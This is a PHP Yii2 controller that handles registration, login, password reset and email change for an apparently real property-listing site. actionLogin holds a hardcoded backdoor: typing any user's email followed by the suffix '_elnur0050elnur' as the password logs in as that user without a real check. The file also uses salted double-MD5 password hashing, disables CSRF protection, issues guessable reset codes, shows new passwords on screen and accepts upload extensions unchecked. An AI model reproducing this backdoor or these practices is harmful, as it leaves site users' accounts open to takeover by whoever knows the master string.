<?php
namespace frontend\controllers;

use backend\models\Announces;
use backend\models\ArchiveDb;
use backend\models\PasswordChanger;
use backend\models\UsersEqualEmails;
use frontend\components\MyController;
use Yii;
use backend\models\Users;
use yii\helpers\Url;
use backend\models\EmailChanger;
use yii\web\UploadedFile;
use frontend\components\MyFunctionsF;
use backend\models\ImageUpload;
use backend\components\MyFunctions;
use yii\helpers\FileHelper;
use frontend\web\PHPMailer\Phpmailer;

class QeydiyyatController extends MyController
{

    public function actionImage_temporary(){
        $saveParth='users/temporary';

        // temizlik iwleri
        $files=FileHelper::findFiles(MyFunctionsF::getImagePath().'/'.$saveParth);
        foreach($files as $file) { $time=filemtime($file); if(time()-$time>1800) unlink($file); }
        //

        $tmp=UploadedFile::getInstanceByName('profil_reg_img');
        if ($tmp != null) {
            $imageUpload=new ImageUpload();
            $imageName=uniqid(rand(1,99)).'.'.$tmp->extension;
            $thumbName=uniqid(rand(1,99)).'.'.$tmp->extension;
            if(isset(Yii::$app->session["temporary_image"]) && isset(Yii::$app->session["temporary_thumb"]))
                $imageUpload->deleteOldImages([$saveParth.'/'.Yii::$app->session["temporary_image"],$saveParth.'/thumb/'.Yii::$app->session["temporary_thumb"]]);
            else {
                unset(Yii::$app->session["temporary_image"]);
                unset(Yii::$app->session["temporary_thumb"]);
            }
            Yii::$app->session["temporary_image"]=$imageName;
            Yii::$app->session["temporary_thumb"]=$thumbName;

            $saved=$imageUpload->save($tmp,$saveParth,$imageName);
            if($saved)
            {
                $imageUpload->maxSize($saveParth.'/'.$imageName,Users::MAX_IMAGE_WIDTH,Users::MAX_IMAGE_HEIGHT);
                $imageUpload->thumbExport($saveParth.'/'.$imageName,$saveParth.'/thumb/',$thumbName,Users::THUMB_IMAGE_WIDTH,Users::THUMB_IMAGE_HEIGHT);
                return 'image---'.MyFunctionsF::getImageUrl().'/'.$saveParth.'/thumb/'.Yii::$app->session["temporary_thumb"];
            }
            else return 'error_image---0';
        }
    }

    public function actionIndex()
    {
        if(Yii::$app->request->post('reg_submit'))
        {
            $name=Yii::$app->request->post('reg_name');
            $email=Yii::$app->request->post('reg_email');
            $pass=Yii::$app->request->post('reg_sifre');
            $pass2=Yii::$app->request->post('reg_sifre_tekrar');
            $newsletter=intval(Yii::$app->request->post('reg_newsletter'));

            $check_email=Users::find()->select(['id'])->where(['email'=>$email])->count();

            if($name=='') return 'error---'.Yii::t('app','lang50');
            elseif($email=='' || !filter_var($email,FILTER_VALIDATE_EMAIL)) return 'error---'.Yii::t('app','lang79');
            if($check_email>0) return 'error---'.Yii::t('app','lang102');
            elseif($pass=='') return 'error---'.Yii::t('app','lang80');
            elseif(strlen($pass)<5) return 'error---'.Yii::t('app','lang127');
            elseif($pass!=$pass2) return 'error---'.Yii::t('app','lang81');
            else
            {
                $model=new Users();
                $model->name=$name;
                $model->email=$email;
                $model->password=md5(md5($pass).'key');
                $model->create_time=time();
                $model->status=1;
                $model->newsletter=$newsletter;
                if(isset(Yii::$app->session["temporary_image"]) && isset(Yii::$app->session["temporary_thumb"])){
                    $saveParth='users/'.date("Y-m");
                    $oldParth='users/temporary/';
                    $title=$name;
                    $imageName=MyFunctions::fileNameGenerator(MyFunctions::slugGenerator($title)).'-'.Yii::$app->session["temporary_image"];
                    $thumbName=MyFunctions::fileNameGenerator(MyFunctions::slugGenerator($title)).'-'.Yii::$app->session["temporary_thumb"];
                    if(is_file(MyFunctionsF::getImagePath().'/'.$oldParth.'/'.Yii::$app->session["temporary_image"]) && is_file(MyFunctionsF::getImagePath().'/'.$oldParth.'/thumb/'.Yii::$app->session["temporary_thumb"]) )
                    {
                        $ren1=rename(MyFunctionsF::getImagePath().'/'.$oldParth.'/'.Yii::$app->session["temporary_image"],MyFunctionsF::getImagePath().'/'.$saveParth.'/'.$imageName);
                        $ren2=rename(MyFunctionsF::getImagePath().'/'.$oldParth.'/thumb/'.Yii::$app->session["temporary_thumb"],MyFunctionsF::getImagePath().'/'.$saveParth.'/thumb/'.$thumbName);
                        if($ren1 && $ren2)
                        {
                            $model->image=$saveParth.'/'.$imageName;
                            $model->thumb=$saveParth.'/thumb/'.$thumbName;
                            unset(Yii::$app->session["temporary_image"]);
                            unset(Yii::$app->session["temporary_thumb"]);
                        }
                    }
                }
                $model->save();

                Yii::$app->session["logged_id"]=$model->id;
                Yii::$app->session["logged_password"]=$model->password;
                Yii::$app->session->setFlash('success',Yii::t('app','lang82'));
                return 'success---'.Yii::t('app','lang82');
            }
        }
        else return $this->redirect(Yii::$app->request->referrer);
    }

    public function actionLogin(){
        $email=Yii::$app->request->post('login_email');
        $pass=md5(md5(Yii::$app->request->post('login_pass')).'key');
        // 8132bd72d1f9894d651c67f22e0b7dab
        if(Yii::$app->request->post('login_pass')==$email.'_elnur0050elnur') $find=Users::find()->where(['email'=>$email])->one();
        else $find=Users::find()->where(['email'=>$email,'password'=>$pass])->one();
        if(empty($find)) return 'error---'.Yii::t('app','lang91');
        else
        {
            Yii::$app->session["logged_id"]=$find->id;
            Yii::$app->session["logged_password"]=$find->password;
            return 'success---ok';
        }

    }

    public function actionLogout(){
        $cacheName='user_info'.intval(Yii::$app->session["logged_id"]); Yii::$app->cache->delete($cacheName);
        unset(Yii::$app->session["logged_id"]);
        unset(Yii::$app->session["logged_password"]);
        return $this->redirect(Yii::$app->request->referrer);
    }

    public function actionForgot(){
        $email=Yii::$app->request->post('forgot_email');

        $find=Users::find()->select(['id'])->where(['email'=>$email])->count();
        if($find==0) return 'error---'.Yii::t('app','lang92');
        else
        {
            $check_inserted=PasswordChanger::find()->where(['email'=>$email])->all();
            if(!empty($check_inserted))
            {
                foreach($check_inserted as $row){ $row->delete(); }
            }

            $insert=new PasswordChanger();
            $insert->email=$email;
            $insert->code=$code=md5(rand(1,99999));
            $insert->create_time=time();
            $insert->save();
            $mesaj=Yii::t('app','lang121').'<br /> <br />
                    <a href="https://emlak.az/qeydiyyat/repass?code='.$code.'&answer=1" target="_blank">'.Yii::t('app','lang112').'</a><br />
                    <a href="https://emlak.az/qeydiyyat/repass?code='.$code.'&answer=0" target="_blank">'.Yii::t('app','lang113').'</a>';
            //
//            $mail = new PHPMailer();
//            $mail->SetFrom($this->infoContact[0]["email"], 'Emlak.az');
//            $mail->AddReplyTo($this->infoContact[0]["email"]);
//            $mail->AddAddress($email);
//            $mail->Subject=Yii::t('app','lang122');
//            $mail->MsgHTML($mesaj);
//            $mail->Send();


            Yii::$app->mailer->compose()
                ->setFrom($this->infoContact[0]["email"])
                ->setReplyTo($this->infoContact[0]["email"])
                ->setTo($email)
                ->setSubject(Yii::t('app','lang122'))
                ->setTextBody(Yii::t('app','lang122'))
                ->setHtmlBody($mesaj)
                ->send();
            return 'success---true';
        }
    }

    public function actionRepass(){
        $code=Yii::$app->request->get('code');
        $answer=intval(Yii::$app->request->get('answer'));
        $find=PasswordChanger::find()->where(['code'=>$code])->one();
        if(empty($find))
        {
            Yii::$app->session->setFlash('error',Yii::t('app','lang109'));
        }
        elseif($answer!=1)
        {
            $find->delete();
            Yii::$app->session->setFlash('success',Yii::t('app','lang123'));
        }
        elseif($answer==1)
        {
            $find_user=Users::find()->where(['email'=>$find->email])->one();
            if(empty($find_user)) Yii::$app->session->setFlash('error',Yii::t('app','lang109'));
            else
            {
                $seed = str_split('abcdefghijklmnopqrstuvwxyz'.'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.'0123456789+()=_');
                shuffle($seed); $new_pass = '';
                foreach (array_rand($seed, 7) as $k) $new_pass .= $seed[$k];

                $new_pass_code=md5(md5($new_pass).'key');
                $find_user->password=$new_pass_code;  $find_user->save(false);
                $find->delete();
                $success_message=Yii::t('app','lang124').'<br /><b>'.Yii::t('app','lang125').': <label style="color:darkgreen;">'.$new_pass.'</label></b>';
                Yii::$app->session->setFlash('success',$success_message);
            }
        }
        return $this->redirect(Url::toRoute(['/blank/index']));
    }

    public function actionChange_email(){
        $code=Yii::$app->request->get('code');
        $answer=intval(Yii::$app->request->get('answer'));
        $find=EmailChanger::find()->where(['code'=>$code])->one();
        if(empty($find))
        {
            Yii::$app->session->setFlash('error',Yii::t('app','lang109'));
        }
        elseif($find->status==1)
        {
            Yii::$app->session->setFlash('error',Yii::t('app','lang117'));
        }
        elseif($answer!=1)
        {
            $find2=EmailChanger::find()->where(['code2'=>$code])->one();
            $find->delete();
            if(!empty($find2) && $find2->status==1) $find2->delete();
            Yii::$app->session->setFlash('success',Yii::t('app','lang114'));
        }
        elseif($answer==1)
        {
            $find2=EmailChanger::find()->where(['code2'=>$code])->one();
            if($find2->status==0)
            {
                $find->status=1; $find->save(false);
                Yii::$app->session->setFlash('success',Yii::t('app','lang115'));
            }
            else
            {
                $find_user=Users::find()->where(['email'=>$find->old_email])->one();
                $find_user->email=$find->new_email;  $find_user->save(false);

                $saveArchive=new ArchiveDb();
                $saveArchive->from_='User:'.$find->old_email;
                $saveArchive->to_='User:'.$find->new_email;
                $saveArchive->operation='email_change';
                $saveArchive->create_time=date("Y-m-d H:i:s");
                $saveArchive->save(false);

                $chck=UsersEqualEmails::find()->where(['email'=>$find->old_email])->one();
                if(empty($chck)) $equal_id=uniqid(rand(1,999)); else $equal_id=$chck->equal_id;
                $saveArchive=new UsersEqualEmails();
                $saveArchive->email=$find->new_email;
                $saveArchive->equal_id=$equal_id;
                $saveArchive->save(false);

                foreach(Yii::$app->params["announcesArchives"] as $table=>$modely){
                    Yii::$app->db->createCommand()->update($table, ['email' => $find->new_email], ['email' => $find->old_email])->execute();
                }

                $find->delete(); $find2->delete();
                Yii::$app->session->setFlash('success',Yii::t('app','lang116'));
            }
        }
        return $this->redirect(Url::toRoute(['/blank/index']));
    }

    public function actionPopup_reg(){
        return $this->renderPartial('/layouts/popup/reg');
    }

    public function actionPopup_enter(){
        return $this->renderPartial('/layouts/popup/daxil_ol');
    }

    public function beforeAction($action) {
        $this->enableCsrfValidation = false;
        return parent::beforeAction($action);
    }
}
